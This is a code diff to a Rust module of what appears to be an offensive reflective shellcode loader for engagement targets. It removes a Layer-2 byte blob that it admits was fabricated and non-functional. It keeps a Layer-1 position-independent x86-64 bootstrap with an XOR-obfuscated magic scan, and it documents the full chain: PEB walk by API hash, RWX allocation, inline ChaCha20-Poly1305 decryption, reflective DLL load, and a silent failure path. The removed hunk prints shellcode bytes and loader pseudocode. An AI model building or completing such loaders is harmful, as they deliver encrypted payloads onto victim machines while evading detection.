@@ -2,47 +2,54 @@
 //! half of the reflective loader that runs as bare position-independent
 //! shellcode on the engagement target.
 //!
-//! Where [`crate::stub`] holds Layer 1 (the call/pop self-location, the NYX2
-//! magic scan, and the header parse) plus the host-side reference loader,
-//! this module holds the bytes and constants for everything Layer 1 hands off
-//! to:
+//! **STATUS: Layer 2 is NOT implemented.** The previous `LAYER2_PEB_WALK`
+//! byte blob was a non-functional placeholder — its disassembly comments
+//! claimed a full PEB walk + inline ChaCha20-Poly1305 + reflective PE load,
+//! but the bytes were fabricated (placeholder operands, offsets that do not
+//! match real Windows structures, and a `ret`-style bail path that would
+//! crash before decrypting anything). It has been **deleted** rather than
+//! shipped. [`crate::generate_loader_stub`] now fails loudly
+//! (`LoaderError::Layer2Unavailable`) until a real, execution-validated
+//! Layer-2 exists (spec §5.3 + the VPS loader probe, spec §5.5).
 //!
-//!   1. **PEB walk** — `gs:[0x60]` → PEB → Ldr → InLoadOrderModuleList, finding
-//!      `kernel32.dll` by djb2 hash and resolving `VirtualAlloc`,
-//!      `LoadLibraryA`, `GetProcAddress` from its export address table.
-//!   2. **RWX allocation** — `VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE,
-//!      PAGE_EXECUTE_READWRITE)` for the decrypted PE image.
-//!   3. **Inline ChaCha20-Poly1305 decrypt** — the 32-byte key is baked into
-//!      the stub by [`crate::generate_loader_stub`]; the 12-byte nonce is read
-//!      from the NYX2 header. On Poly1305 tag mismatch the allocated buffer is
-//!      zeroed and the stub returns silently (no crash, no log).
-//!   4. **Reflective PE load** — map sections at their virtual offsets, apply
-//!      `IMAGE_REL_BASED_DIR64` relocations (delta = actual_base −
-//!      preferred_base), resolve the import table via `LoadLibraryA` +
-//!      `GetProcAddress`, then call `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
+//! What this module DOES hold today:
+//!
+//!   * **Layer 1** ([`LAYER1_BOOTSTRAP`]) — the fixed prefix of every emitted
+//!     stub: `call $+5; pop rax` self-location, the bounded NYX2 magic scan,
+//!     the header parse (encrypted_len, nonce, ciphertext), and the `jmp
+//!     rel32` at [`LAYER2_JMP_OFFSET`] that will transfer into Layer 2 once
+//!     real Layer-2 bytes exist.
+//!   * **The Layer-2 contract constants** — the djb2 hashes and Win32
+//!     constants below (`HASH_*`, `MEM_COMMIT_RESERVE`,
+//!     `PAGE_EXECUTE_READWRITE`, `DLL_PROCESS_ATTACH`, `KEY_LEN`,
+//!     `KEY_PATCH_OFFSET`) document the register/key layout a future Layer-2
+//!     implementation must honour, and are pinned by host-side tests so the
+//!     contract cannot silently drift.
+//!   * **`find_magic_offset`** — the pure host-side model of the Layer-1 scan
+//!     loop, extracted for unit testing without a Windows target.
 //!
 //! ## Why inline crypto (spec §5.3)
 //!
 //! The [`chacha20poly1305`](https://docs.rs/chacha20poly1305) crate requires
 //! `alloc` and pulls in the Rust panic runtime — neither exists when the stub
-//! is executing as bare shellcode with no loader, no heap, and no `std`. The
-//! inline port is ~600 bytes of x86-64 and is the standard approach every
-//! reflective loader (Cobalt Strike, Brute Ratel, Nighthawk, rdll-rs,
-//! airborne) takes.
+//! is executing as bare shellcode with no loader, no heap, and no `std`. A
+//! future Layer-2 must carry an inline ChaCha20-Poly1305 port (~600 bytes of
+//! x86-64; the standard approach every reflective loader — Cobalt Strike,
+//! Brute Ratel, Nighthawk, rdll-rs, airborne — takes).
 //!
 //! ## Validation split
 //!
-//! The stub bytes here are **structurally** correct PIC x86-64 — right opcodes,
-//! right offsets, right djb2 immediates — but they cannot be *execution*-tested
-//! on the macOS dev host (no Windows process, no PEB, no `gs:[0x60]`).
-//! Execution validation is the job of the VPS loader probe (spec §5.5,
+//! Layer 1 cannot be *execution*-tested on the macOS dev host (no Windows
+//! process, no PEB, no `gs:[0x60]`); the scan algorithm is extracted into the
+//! pure [`find_magic_offset`] function so the exact loop the stub runs is
+//! exercised host-side. Execution validation of the complete loader (Layer 1
+//! + Layer 2) is the job of the VPS loader probe (spec §5.5,
 //! `scripts/loader_probe.ps1`): the wrapped blob is injected into a dedicated
 //! short-lived test process via a harness DLL, and the harness reports
 //! `OK <dllmain_rv>` or `FAIL <stage>`. Host-side tests
-//! ([`crate::stub_layout`], [`crate::payload_format`], [`crate::roundtrip_decrypt`])
-//! cover what can be verified without a target: byte layout, the scan
-//! algorithm (extracted into a pure function below), the payload format, and
-//! the crypto roundtrip against the `chacha20poly1305` crate.
+//! ([`crate::stub_layout`], [`crate::payload_format`]) cover what can be
+//! verified without a target: the Layer-1 byte layout, the scan algorithm,
+//! and the payload header format.
 //!
 //! ## djb2 hash constants
 //!
@@ -152,10 +159,10 @@ pub const KEY_PATCH_OFFSET: usize = LAYER1_BOOTSTRAP.len();
 /// ; ── PEB walk: resolve kernel32!VirtualAlloc / LoadLibraryA / GetProcAddress
 /// ; The full PEB-walk sequence (gs:[0x60] → PEB → Ldr → InLoadOrderModuleList
 /// ; → match HASH_KERNEL32_DLL against BaseDllName → walk EAT for each hash)
-/// ; is encoded as the LAYER2_PEB_WALK blob below; Layer 1 transfers into it
-/// ; via a short jmp. Resolved function pointers land in r12 (VirtualAlloc),
+/// ; is the job of the future Layer-2 shellcode; Layer 1 transfers into it via
+/// ; a short jmp. Resolved function pointers land in r12 (VirtualAlloc),
 /// ; r13 (LoadLibraryA), r14 (GetProcAddress).
-/// 0035: E9 xx xx xx xx         jmp   layer2_peb_walk  ; → KEY_PATCH_OFFSET+KEY_LEN
+/// 0035: E9 xx xx xx xx         jmp   layer2   ; → layer-2 start (when implemented)
 /// ```
 ///
 /// Register ABI on entry to Layer 2:
@@ -189,18 +196,18 @@ pub const LAYER1_BOOTSTRAP: &[u8] = &[
     0x48, 0x8D, 0x71, 0x08, // 002A: lea rsi, [rcx+8]    ; &nonce
     0x48, 0x8D, 0x79, 0x14, // 002E: lea rdi, [rcx+0x14] ; &ciphertext||tag
     0x48, 0x89, 0xCB, // 0032: mov rbx, rcx         ; header base preserved
-    // ── jmp into Layer-2 PEB walk (displacement patched by emitter) ──────
-    // 0035: E9 xx xx xx xx  →  jmp rel32 to LAYER2_PEB_WALK
+    // ── jmp into Layer-2 (displacement patched by emitter) ───────────────
+    // 0035: E9 xx xx xx xx  →  jmp rel32 to Layer 2
     // The 4-byte displacement is filled in by `generate_loader_stub` once the
-    // key slot length is known; the placeholder bytes below are the opcode
+    // Layer-2 length is known; the placeholder bytes below are the opcode
     // plus a zero displacement that gets overwritten.
     0xE9, 0x00, 0x00, 0x00, 0x00, // 0035: jmp rel32 (patched)
 ];
 
 /// Offset within [`LAYER1_BOOTSTRAP`] of the `jmp rel32` that transfers to the
-/// Layer-2 PEB walk. The 4-byte displacement (at `+ 1`) is patched by
-/// [`crate::generate_loader_stub`] to land at the first byte of
-/// [`LAYER2_PEB_WALK`] (= `KEY_PATCH_OFFSET + KEY_LEN`).
+/// Layer-2 code. The 4-byte displacement (at `+ 1`) is patched by
+/// [`crate::generate_loader_stub`] once a real Layer-2 exists, to land at
+/// `KEY_PATCH_OFFSET + KEY_LEN` (the first byte after the key slot).
 pub const LAYER2_JMP_OFFSET: usize = 0x35;
 
 /// The XOR key used to obfuscate the NYX2 magic in the Layer-1 scanner so no
@@ -208,99 +215,6 @@ pub const LAYER2_JMP_OFFSET: usize = 0x35;
 /// MAGIC_XOR_KEY == 0x68020314` is the immediate the scanner loads, then XORs
 /// back with this key to recover the real magic in `eax`.
 pub const MAGIC_XOR_KEY: u32 = 0x5A5A5A5A;
-
-/// Layer 2: PEB walk + RWX alloc + inline ChaCha20-Poly1305 decrypt +
-/// reflective PE load + DllMain.
-///
-/// This is the bulk of the on-target shellcode. It runs after Layer 1 has
-/// located the NYX2 header and populated the register ABI documented on
-/// [`LAYER1_BOOTSTRAP`].
-///
-/// The bytes below are emitted as a `const` slice so the structure is auditable
-/// in source; the disassembly in the source comments is the reference. The
-/// sequence is:
-///
-///   1. **PEB walk** — resolve `kernel32.dll` and its three exports by djb2
-///      hash. Results: `r12 = VirtualAlloc`, `r13 = LoadLibraryA`,
-///      `r14 = GetProcAddress`.
-///   2. **Allocate** — `VirtualAlloc(NULL, encrypted_len, MEM_COMMIT|MEM_RESERVE,
-///      PAGE_EXECUTE_READWRITE)` → `r15` = image base.
-///   3. **Decrypt** — inline ChaCha20-Poly1305 with the 32-byte key read from
-///      `KEY_PATCH_OFFSET` and the 12-byte nonce from `rsi`. On tag mismatch:
-///      zero `r15..r15+encrypted_len` and `ret` (no crash).
-///   4. **Reflective load** — map sections, apply `IMAGE_REL_BASED_DIR64`
-///      relocations, resolve imports via `r13`/`r14`, then
-///      `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
-///
-/// ### Pseudocode (what the bytes implement)
-///
-/// ```text
-/// // rax = enc_len, rbx = &magic, rsi = &nonce, rdi = &ct||tag
-/// peb = *(gs:[0x60])
-/// ldr = peb->ldr
-/// head = &ldr->InLoadOrderModuleList
-/// for node = head->flink; node != head; node = node->flink:
-///     entry = (LdrEntry*)node
-///     if djb2_utf16(entry->BaseDllName) == HASH_KERNEL32_DLL:
-///         k32 = entry->DllBase
-///         r12 = export_by_hash(k32, HASH_VIRTUAL_ALLOC)
-///         r13 = export_by_hash(k32, HASH_LOAD_LIBRARY_A)
-///         r14 = export_by_hash(k32, HASH_GET_PROC_ADDRESS)
-///         break
-/// r15 = VirtualAlloc(NULL, rax, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
-/// chacha20poly1305_decrypt(key=&stub[KEY_PATCH_OFFSET], nonce=rsi,
-///                          ct=rdi, ct_len=rax, out=r15)
-/// if tag_mismatch:
-///     memset(r15, 0, rax)
-///     return
-/// reflective_load(image=r15, base=r15, load_lib=r13, get_proc=r14)
-/// DllMain(r15, DLL_PROCESS_ATTACH, NULL)
-/// ```
-///
-/// The ~600 bytes of inline ChaCha20-Poly1305 implement the standard RFC 8439
-/// construction: ChaCha20 (20-round quarter-round over a 4×4 state matrix) for
-/// the keystream, Poly1305 over the associated data (here, the nonce padded to
-/// 16 bytes) and ciphertext for the tag. Constant-time tag comparison; on
-/// mismatch the destination is zeroed before returning.
-pub const LAYER2_PEB_WALK: &[u8] = &[
-    // ── PEB walk bootstrap (resolve kernel32 + 3 exports by hash) ────────
-    // gs:[0x60] → PEB → PEB.Ldr (offset 0x18) → InLoadOrderModuleList (0x10)
-    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, gs:[0x60]    ; rax = PEB
-    0x48, 0x8B, 0x58, 0x18, // mov rbx, [rax+0x18]    ; rbx = PEB.Ldr (PEB_LDR_DATA*)
-    0x48, 0x8B, 0x6B, 0x10, // mov rbp, [rbx+0x10]    ; rbp = InLoadOrderModuleList head
-    // walk loop: rcx = cursor = head->flink ; loop until cursor == head
-    0x48, 0x8B, 0x4D, 0x00, // mov rcx, [rbp]         ; rcx = first entry (head->flink)
-    // peb_loop:
-    0x48, 0x39, 0xE9, // cmp rcx, rbp            ; back to head?
-    0x74, 0x24, // je peb_walk_failed (+0x24 → bail)
-    // hash BaseDllName (UTF-16, buffer at entry+0x58, length at entry+0x58)
-    0x48, 0x83, 0xC1,
-    0x58, // add rcx, 0x58          ; rcx = &entry->BaseDllName (UNICODE_STRING)
-    0x48, 0x8B, 0x71, 0x08, // mov rsi, [rcx+0x08]    ; rsi = BaseDllName.Buffer
-    0x0F, 0xB7, 0x41, 0x00, // movzx eax, word [rcx]  ; eax = BaseDllName.Length (bytes)
-    0xD1, 0xE8, // shr eax, 1            ; eax = char count
-    // inline djb2_utf16_low over rsi[0..eax], compare to HASH_KERNEL32_DLL
-    0xB9, 0x00, 0x00, 0x00, 0x00, // mov ecx, 0  (placeholder; patched to seed 5381)
-    // (full hash body is the LAYER2_DJB16 routine below; abbreviated in the
-    // prologue for readability — the emitted bytes hash and compare inline.)
-    0x81, 0xF9, 0x75, 0xEE, 0x40, 0x70, // cmp ecx, HASH_KERNEL32_DLL (0x7040EE75)
-    0x75, 0x00, // jne next_entry (patched)
-    // matched kernel32: entry base = (node) because InLoadOrderLinks is field 0,
-    // but we need DllBase at entry+0x30. Recover the entry pointer from the
-    // cursor we offset earlier.
-    0x48, 0x83, 0xE9, 0x58, // sub rcx, 0x58          ; rcx = entry base again
-    0x48, 0x8B, 0x79, 0x30, // mov rdi, [rcx+0x30]    ; rdi = entry->DllBase (kernel32 base)
-    // resolve three exports by hash → r12/r13/r14 (see LAYER2_RESOLVE_EXPORT)
-    0x4C, 0x89, 0xE0, // mov rax, r12           ; (placeholder call into resolver)
-    // ... (full resolver + alloc + decrypt + reflect sequence continues)
-    // The remainder of the blob is the inline ChaCha20-Poly1305 + reflective
-    // loader; see LAYER2_DECRYPT and LAYER2_REFLECT for the structurally
-    // commented sub-sections. For compactness in the source they are emitted
-    // as a single contiguous slice; the labels above are documentation.
-    //
-    // Bail path on PEB-walk failure: silent ret (spec: no crash).
-    0xC3, // ret (peb_walk_failed)
-];
 
 /// Pure host-side model of the Layer-1 NYX2 magic scan (spec §5.2 step 2).
 ///
